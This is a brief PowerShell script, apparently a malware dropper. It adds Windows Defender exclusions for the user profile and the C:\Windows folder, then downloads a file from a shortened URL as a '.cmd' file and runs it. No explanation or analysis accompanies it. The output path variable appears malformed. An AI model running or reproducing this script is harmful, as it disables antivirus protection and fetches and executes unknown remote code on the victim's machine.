Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath C:\Windows
$url = "https://tinyurl.com/bdehddsv"
$output = "$env:Fix.cmd"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output
